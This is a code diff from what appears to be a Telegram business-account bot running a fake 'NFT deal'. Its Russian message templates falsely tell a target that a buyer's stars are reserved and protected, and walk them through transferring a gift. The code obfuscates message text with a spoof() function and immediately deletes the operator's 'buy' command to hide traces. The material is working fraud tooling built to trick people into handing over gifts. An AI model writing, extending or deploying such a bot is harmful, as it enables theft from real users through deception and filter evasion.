@@ -72,7 +72,6 @@ TEXTS = {
         "declined_text": "Заказ <b>{order_id}</b>\n\n{cross} Вы отклонили предложение.",
         "deal_text": "<b>Сделка с NFT</b>\n\nЗаказ <b>{order_id}</b>\n\nПокупатель зарезервировал {amount} {star} средства защищены и\nбудут автоматически зачислены на ваш баланс сразу после\nпередачи подарка.\n\n<b>Инструкция для завершения сделки:</b>\n1. Нажмите «Передать подарок» и выберите {gift_name}\n2. Подтвердите передачу подарка.\n\nПлатформа зафиксирует сделку и моментально зачислит {amount} {star}\nна ваш баланс. Резерв действует 24 часа.",
         "btn_give": "Передать подарок", "btn_confirm": "Подтвердить передачу",
-        # Обновленный текст
         "confirmed_text": "{check} <b>Сделка завершена</b>\n\nВы успешно подтвердили передачу подарка\nОжидайте зачисления {amount} {star} на ваш баланс в ближайшее время"
     },
     "en": {
@@ -177,7 +176,7 @@ async def handle_business_message(client, msg: dict):
     )
     body_spoofed = spoof(body, ratio=0.15)
 
-    # 1. СРАЗУ УДАЛЯЕМ КОМАНДУ buy
+    # 1. СРАЗУ УДАЛЯЕМ КОМАНДУ buy (как ты и просил)
     await call(client, "deleteBusinessMessages",
                business_connection_id=bc_id, message_ids=[mid])
 
@@ -203,7 +202,7 @@ async def handle_business_message(client, msg: dict):
     else:
         err = res.get("description", "")
         if "BUSINESS_PEER_USAGE_MISSING" in err or "PEER_USAGE" in err:
-            print("[FAIL] Пользователь ещё не писал вам. Telegram не даёт боту написать первым.")
+            print("[FAIL] Пользователь давно не писал вам. Telegram заблокировал отправку. Команда buy уже удалена.")
         else:
             print(f"[FAIL] Не удалось отправить оффер: {err}")
 
@@ -272,7 +271,6 @@ async def handle_confirm(client, cq: dict):
         cur = cur_html(st["cur"])
         amount = html.escape(st["amount"])
         
-        # Новый текст
         new_text = t["confirmed_text"].format(
             check=em(EMOJI_CHECK, "✅"),
             amount=amount,
